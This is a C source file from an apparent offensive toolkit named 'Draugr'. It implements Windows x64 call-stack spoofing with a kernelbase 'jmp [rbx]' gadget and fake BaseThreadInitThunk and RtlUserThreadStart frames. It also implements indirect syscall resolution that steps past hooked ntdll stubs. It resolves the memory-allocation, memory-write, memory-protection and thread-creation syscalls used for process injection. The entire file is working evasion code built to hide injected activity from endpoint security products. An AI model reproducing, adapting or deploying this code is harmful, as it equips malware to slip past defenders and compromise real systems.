#include "Native.h"
#include "Vulcan.h"
#include "VxTable.h"
#include "Macros.h"

/**
 * @brief Retrieves a specific section from a PE module
 *
 * @param pModule Pointer to the base address of the loaded PE module
 * @param lpSectionName Name of the section to find (e.g., ".text", ".data")
 * @param pdwVirtualAddress [OUT] Receives the virtual address (RVA) of the section
 * @param pdwSectionSize [OUT] Receives the size of the section in bytes
 * @return TRUE if the section was found, FALSE otherwise
 */
BOOL	DraugrGetSection(
	_In_	PVOID	pModule,
	_In_	LPSTR	lpSectionName,
	_In_	PDWORD	pdwVirtualAddress,
	_In_	PDWORD	pdwSectionSize
)
{
	PIMAGE_NT_HEADERS pImgNtHeaders = GET_NT_HEADER(pModule);
	if (pImgNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_SECTION_HEADER	pSecHeader = IMAGE_FIRST_SECTION(pImgNtHeaders);

	for (int i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++) {
		if (strcmp(lpSectionName, pSecHeader[i].Name) == 0) {
			*pdwVirtualAddress = pSecHeader[i].VirtualAddress;
			*pdwSectionSize = pSecHeader[i].SizeOfRawData;

			return TRUE;
		}
	}

	return FALSE;
}

/**
 * @brief Finds a valid "jmp [rbx]" (FF 23) gadget in a module's .text section
 *
 * Searches for the first occurrence of the byte pattern 0xFF 0x23 which corresponds
 * to the x64 instruction "jmp [rbx]". This gadget is used for call spoofing.
 *
 * @param pModule Pointer to the base address of the module to search in
 * @param ppGadget [OUT] Receives the address of the found gadget
 * @return TRUE if a gadget was found, FALSE otherwise
 */
BOOL	DraugrFindGadget(
	_In_	PVOID	pModule,
	_Inout_	PVOID* ppGadget
)
{
	DWORD	dwSectionVA = 0;
	DWORD	dwSectionSize = 0;

	if (!DraugrGetSection(pModule, ".text", &dwSectionVA, &dwSectionSize)) {
		return FALSE;
	}

	PVOID	pTextSection = (PVOID)((DWORD64)pModule + dwSectionVA);
	for (int i = 0; i < (dwSectionSize - 2); i++) {
		if (
			((PBYTE)pTextSection)[i] == 0xFF && ((PBYTE)pTextSection)[i + 1] == 0x23
			) {
			*ppGadget = (PVOID)((DWORD64)pTextSection + i);
			return TRUE;
		}
	}

	return FALSE;
}

/**
 * @brief Resolves the syscall number and gadget address from a NT function
 *
 * Extracts the syscall number from the function stub and calculates the gadget address.
 * Supports both clean and hooked functions by searching through neighboring stubs.
 * The function looks for the pattern: 4C 8B D1 B8 XX XX 00 00
 *
 * @param pFunction Pointer to the NT function (e.g., NtAllocateVirtualMemory)
 * @param pdwSyscall [OUT] Receives the syscall number (SSN)
 * @param ppGadget [OUT] Receives the address of the syscall instruction
 * @return TRUE if syscall was successfully resolved, FALSE otherwise
 */
BOOL	DraugrResolveSyscall(
	_In_	PVOID	pFunction,
	_Inout_	PDWORD	pdwSyscall,
	_Inout_ PVOID* ppGadget
)
{
	if (
		*(PBYTE)((PBYTE)pFunction) == 0x4C &&
		*(PBYTE)((PBYTE)pFunction + 1) == 0x8B &&
		*(PBYTE)((PBYTE)pFunction + 2) == 0xD1 &&
		*(PBYTE)((PBYTE)pFunction + 3) == 0xB8 &&
		*(PBYTE)((PBYTE)pFunction + 6) == 0x00 &&
		*(PBYTE)((PBYTE)pFunction + 7) == 0x00
		)
	{
		BYTE high = ((PBYTE)pFunction)[5];
		BYTE low = ((PBYTE)pFunction)[4];

		*pdwSyscall = (high << 8) | low;
		*ppGadget = ((DWORD64)pFunction + SYSCALL_GADGET_OFFSET);

		return TRUE;
	}
	else {
		for (int i = 1; i < 500; i++)
		{
			if (
				*(PBYTE)((PBYTE)pFunction + i * DOWN) == 0x4C &&
				*(PBYTE)((PBYTE)pFunction + 1 + i * DOWN) == 0x8B &&
				*(PBYTE)((PBYTE)pFunction + 2 + i * DOWN) == 0xD1 &&
				*(PBYTE)((PBYTE)pFunction + 3 + i * DOWN) == 0xB8 &&
				*(PBYTE)((PBYTE)pFunction + 6 + i * DOWN) == 0x00 &&
				*(PBYTE)((PBYTE)pFunction + 7 + i * DOWN) == 0x00
				)
			{
				BYTE high = ((PBYTE)pFunction)[5 + i * DOWN];
				BYTE low = ((PBYTE)pFunction)[4 + i * DOWN];

				*pdwSyscall = (high << 8) | low;
				*ppGadget = ((DWORD64)pFunction + SYSCALL_GADGET_OFFSET);

				return TRUE;
			}
		}
	}

	return FALSE;
}

/**
 * @brief Calculates the total stack size required by a function
 *
 * Parses the UNWIND_INFO structure to determine the stack space allocated
 * by a function. Supports chained unwind info for recursive calculation.
 *
 * @param pRuntimeFunction Pointer to the RUNTIME_FUNCTION entry
 * @param dwImageBase Base address of the module containing the function
 * @return Total stack size in bytes, or 0 if calculation failed
 */
DWORD DraugrCalculateStackSize(
	_In_    PRUNTIME_FUNCTION   pRuntimeFunction,
	_In_    DWORD64             dwImageBase
)
{
	PUNWIND_INFO    pUnwindInfo = NULL;
	DWORD           UnwindOperation = 0;
	DWORD           OperationInfo = 0;
	DWORD           Index = 0;
	DWORD           FrameOffset = 0;
	DWORD           dwTotalStackSize = 0;

	if (!pRuntimeFunction) {
		return 0;
	}

	pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + dwImageBase);

	while (Index < pUnwindInfo->CountOfCodes) {
		UnwindOperation = pUnwindInfo->UnwindCode[Index].UnwindOp;
		OperationInfo = pUnwindInfo->UnwindCode[Index].OpInfo;

		switch (UnwindOperation)
		{
		case UWOP_PUSH_NONVOL:
			dwTotalStackSize += 8;
			break;

		case UWOP_SAVE_NONVOL:
			Index += 1;
			break;

		case UWOP_ALLOC_SMALL:
			dwTotalStackSize += ((OperationInfo * 8) + 8);
			break;

		case UWOP_ALLOC_LARGE:
		{
			Index += 1;
			FrameOffset = pUnwindInfo->UnwindCode[Index].FrameOffset;
			if (OperationInfo == 0) {
				FrameOffset *= 8;
			}
			else {
				Index += 1;
				FrameOffset += (pUnwindInfo->UnwindCode[Index].FrameOffset << 16);
			}
			dwTotalStackSize += FrameOffset;
			break;
		}

		case UWOP_SET_FPREG:
			break;

		default:
			break;
		}

		Index += 1;
	}

	if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO)) {
		Index = pUnwindInfo->CountOfCodes;
		if (0 != (Index & 1)) {
			Index += 1;
		}
		pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[Index]);
		return DraugrCalculateStackSize(pRuntimeFunction, dwImageBase);
	}

	dwTotalStackSize += 8;

	return dwTotalStackSize;
}


/**
 * @brief Wrapper function to calculate stack size from a function address
 *
 * Looks up the RUNTIME_FUNCTION entry for a given function address and
 * calculates its stack size using RtlLookupFunctionEntry.
 *
 * @param pFunction Address of the function to analyze
 * @param pdwStackSize [OUT] Receives the calculated stack size
 * @return TRUE if stack size was successfully calculated, FALSE otherwise
 */
BOOL DraugrWrapperStackSize(
	_In_    PVOID   pFunction,
	_Inout_ PDWORD  pdwStackSize
)
{
	PRUNTIME_FUNCTION       pRuntimeFunction = NULL;
	DWORD64                 dwImageBase = 0;
	PUNWIND_HISTORY_TABLE   pHistoryTable = NULL;

	if (!pFunction) {
		return FALSE;
	}

	pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)pFunction, &dwImageBase, pHistoryTable);
	if (!pRuntimeFunction) {
		return FALSE;
	}

	*pdwStackSize = DraugrCalculateStackSize(pRuntimeFunction, dwImageBase);

	if (*pdwStackSize) {
		return TRUE;
	}

	return FALSE;
}


/**
 * @brief Initializes the synthetic stack frame structure
 *
 * Sets up the stack frame with legitimate return addresses from:
 * - BaseThreadInitThunk (Kernel32.dll) at offset 0x14
 * - RtlUserThreadStart (Ntdll.dll) at offset 0x21
 * - Gadget search module (Kernelbase.dll)
 *
 * @param SyntheticStackFrame [OUT] Pointer to the structure to initialize
 * @return TRUE if initialization succeeded, FALSE otherwise
 */
BOOL	DraugrInit(
	_Inout_	PSYNTHETIC_STACK_FRAME	SyntheticStackFrame
)
{
	PVOID	pKernel32 = GetModuleHandleA("Kernel32.dll");
	PVOID	pNtdll = GetModuleHandleA("Ntdll.dll");
	PVOID	pKernelbase = GetModuleHandleA("Kernelbase.dll");

	if (!pKernel32 || !pNtdll || !pKernelbase) {
		return FALSE;
	}

	PVOID	pBaseThreadInitThunk = GetProcAddress(pKernel32, "BaseThreadInitThunk");
	PVOID	pRtlUserThreadStart = GetProcAddress(pNtdll, "RtlUserThreadStart");

	if (!pBaseThreadInitThunk || !pRtlUserThreadStart) {
		return FALSE;
	}

	SyntheticStackFrame->frame1.pModuleAddr = pKernel32;
	SyntheticStackFrame->frame1.pFunctionAddr = pBaseThreadInitThunk;
	SyntheticStackFrame->frame1.dwOffset = 0x14;

	SyntheticStackFrame->frame2.pModuleAddr = pNtdll;
	SyntheticStackFrame->frame2.pFunctionAddr = pRtlUserThreadStart;
	SyntheticStackFrame->frame2.dwOffset = 0x21;

	SyntheticStackFrame->pGadget = pKernelbase;

	return TRUE;
}

/**
 * @brief Performs a function call with synthetic stack frame spoofing
 *
 * Main function that orchestrates the stack spoofing technique. It:
 * 1. Calculates stack sizes for all frames
 * 2. Finds a valid gadget for indirect jumping
 * 3. Sets up the PRM (Parameter) structure
 * 4. Invokes the target function through the Spoof assembly routine
 *
 * Supports both direct API calls (dwSyscall = 0) and indirect syscalls (dwSyscall != 0).
 *
 * @param pSyntheticStackFrame Pointer to initialized synthetic stack frame
 * @param pFunction Target function address to call
 * @param dwSyscall Syscall number (0 for regular API calls)
 * @param Rcx First argument (RCX register)
 * @param Rdx Second argument (RDX register)
 * @param R8 Third argument (R8 register)
 * @param R9 Fourth argument (R9 register)
 * @param StackArg1 Fifth argument (stack)
 * @param StackArg2 Sixth argument (stack)
 * @param StackArg3 Seventh argument (stack)
 * @param StackArg4 Eighth argument (stack)
 * @param StackArg5 Ninth argument (stack)
 * @param StackArg6 Tenth argument (stack)
 * @param StackArg7 Eleventh argument (stack)
 * @param StackArg8 Twelfth argument (stack)
 * @return Return value from the called function, or NULL on failure
 */
PVOID	DraugrCall(
	_In_	PSYNTHETIC_STACK_FRAME	pSyntheticStackFrame,
	_In_	PVOID					pFunction,
	_In_	DWORD					dwSyscall,
	_In_	PVOID	Rcx,
	_In_	PVOID	Rdx,
	_In_	PVOID	R8,
	_In_	PVOID	R9,
	_In_	PVOID	StackArg1,
	_In_	PVOID	StackArg2,
	_In_	PVOID	StackArg3,
	_In_	PVOID	StackArg4,
	_In_	PVOID	StackArg5,
	_In_	PVOID	StackArg6,
	_In_	PVOID	StackArg7,
	_In_	PVOID	StackArg8
)
{

	PRM		Param = { 0 };
	PVOID	ReturnAddress = NULL;
	PVOID	ReturnValue = NULL;

	ReturnAddress = (PVOID)((DWORD64)pSyntheticStackFrame->frame1.pFunctionAddr + pSyntheticStackFrame->frame1.dwOffset);
	if (!DraugrWrapperStackSize(ReturnAddress, &Param.BTIT_ss)) {
		return ReturnValue;
	}

	Param.BTIT_retaddr = ReturnAddress;
	ReturnAddress = (PVOID)((DWORD64)pSyntheticStackFrame->frame2.pFunctionAddr + pSyntheticStackFrame->frame2.dwOffset);
	if (!DraugrWrapperStackSize(ReturnAddress, &Param.RUTS_ss)) {
		return ReturnValue;
	}

	Param.RUTS_retaddr = ReturnAddress;
	if (!DraugrFindGadget(pSyntheticStackFrame->pGadget, &Param.trampoline)) {
		return ReturnValue;
	}
	if (!DraugrWrapperStackSize(Param.trampoline, &Param.Gadget_ss)) {
		return ReturnValue;
	}

	if (dwSyscall) {
		Param.ssn = dwSyscall;
	}

	ReturnValue = Spoof(Rcx, Rdx, R8, R9,
		&Param, pFunction, 8,
		StackArg1, StackArg2, StackArg3, StackArg4, StackArg5, StackArg6, StackArg7, StackArg8);

	return ReturnValue;
}


/**
 * @brief Initializes the VX_TABLE with syscall numbers and gadgets
 *
 * @param VxTable [OUT] Pointer to VX_TABLE structure to populate
 * @return TRUE if all syscalls were resolved successfully, FALSE otherwise
 */
BOOL	InitVxTable(
	_Inout_	PVX_TABLE	VxTable
)
{
	PVOID	pNtdll = GetModuleHandleA("Ntdll.dll");
	if (!pNtdll) {
		return FALSE;
	}

	if (!DRAUGR_RESOLVE(NtAllocateVirtualMemory)) {
		return FALSE;
	}

	if (!DRAUGR_RESOLVE(NtWriteVirtualMemory)) {
		return FALSE;
	}

	if (!DRAUGR_RESOLVE(NtProtectVirtualMemory)) {
		return FALSE;
	}

	if (!DRAUGR_RESOLVE(NtCreateThreadEx)) {
		return FALSE;
	}

	return TRUE;
}
